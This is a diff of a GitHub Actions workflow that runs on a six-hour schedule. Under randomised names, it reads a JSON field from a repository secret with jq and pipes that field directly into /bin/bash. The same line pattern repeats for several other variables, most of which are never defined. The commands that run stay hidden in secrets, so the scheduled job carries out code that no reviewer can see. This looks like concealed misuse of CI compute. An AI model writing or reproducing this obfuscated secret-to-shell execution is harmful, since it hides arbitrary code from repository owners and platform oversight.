@@ -1,22 +1,26 @@
 name: pangxifeng5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '22 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pangxifeng5678
         env:
-          yds64: ${{ secrets.yds64 }}
+          ojhxh0093: ${{ secrets.ojhxh0093 }}
         run: |
-          echo $yds64 | jq -r .aa20 | /bin/bash
-          echo $fida5 | jq -r .lwkyn1360 | /bin/bash
-          echo $kknq1337 | jq -r .ees5 | /bin/bash
-          echo $iymy5 | jq -r .ekmj0 | /bin/bash
-          echo $xd8 | jq -r .wbutx4 | /bin/bash
-          echo $gnvhq744 | jq -r .ezyo36 | /bin/bash
+          echo $ojhxh0093 | jq -r .igvza1409 | /bin/bash
+          echo $hfu5 | jq -r .gd3172 | /bin/bash
+          echo $zeoxs883 | jq -r .wbmbj76463 | /bin/bash
+          echo $wksde32 | jq -r .bz175 | /bin/bash
+          echo $vmrr00 | jq -r .ezvuh93 | /bin/bash
+          echo $xr840 | jq -r .o1745 | /bin/bash
+          echo $m1051 | jq -r .tetc28895 | /bin/bash
+          echo $z27 | jq -r .mao70015 | /bin/bash
+          echo $le3146 | jq -r .hwruz21 | /bin/bash
+          echo $itei0 | jq -r .tyqu2753 | /bin/bash
 
